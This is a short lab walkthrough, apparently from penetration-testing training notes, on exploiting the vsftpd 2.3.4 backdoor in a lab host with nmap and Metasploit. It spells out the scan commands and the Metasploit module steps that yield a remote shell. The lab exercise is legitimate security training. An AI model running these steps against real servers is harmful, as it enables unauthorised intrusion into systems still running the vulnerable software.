# Vulnerable FTP Server

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4658–4686. Examples are lab-specific and need verification.

VSFTPD (Very Secure FTP Daemon) is a FTP server software for Unix-like systems designed to be fast and lightweight while providing essential features for file transfer operations.

In this lab, we will look at how to exploit a vulnerable FTP server using the Metasploit Framework.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable FTP server will be accessible at **demo.ine.local**.

**Objective:** Exploit the server using suitable Metasploit module and get a shell on the target.

Tools: nmap, msf

```bash
#21/tcp open  ftp     vsftpd 2.3.4
nmap -Pn -A -T4 demo.ine.local
nmap -p 21 --script vuln demo.ine.local

msfconsole
search vsftpd
use 1
or
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set rhosts demo.ine.local
exploit
#got shell

```
